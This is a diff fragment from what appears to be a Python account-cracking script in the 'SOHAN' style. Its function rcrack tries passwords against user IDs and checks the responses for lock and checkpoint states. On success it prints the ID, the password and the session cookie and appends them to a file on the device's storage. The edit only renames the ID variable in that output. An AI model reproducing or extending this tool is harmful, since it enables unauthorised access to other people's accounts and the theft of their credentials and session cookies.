@@ -288,9 +288,9 @@ def rcrack(uid,pwx,tl):
                 if 'LOCK' in res:
                     return 'LOCK'
                 else:
-                    print(f"\r\033[38;5;46m[SOHAN-OK 💚] {uid}|{ps}")
+                    print(f"\r\033[38;5;46m[SOHAN-OK 💚] {cid}|{ps}")
                     print(f'  \r\033[1;92m   [COOKIE🍪] '+coki)
-                    open('/sdcard/SOHAN RAN.txt', 'a').write( uid+' | '+ps+'|'+coki+'\n')
+                    open('/sdcard/SOHAN RAN.txt', 'a').write( cid+' | '+ps+'|'+coki+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
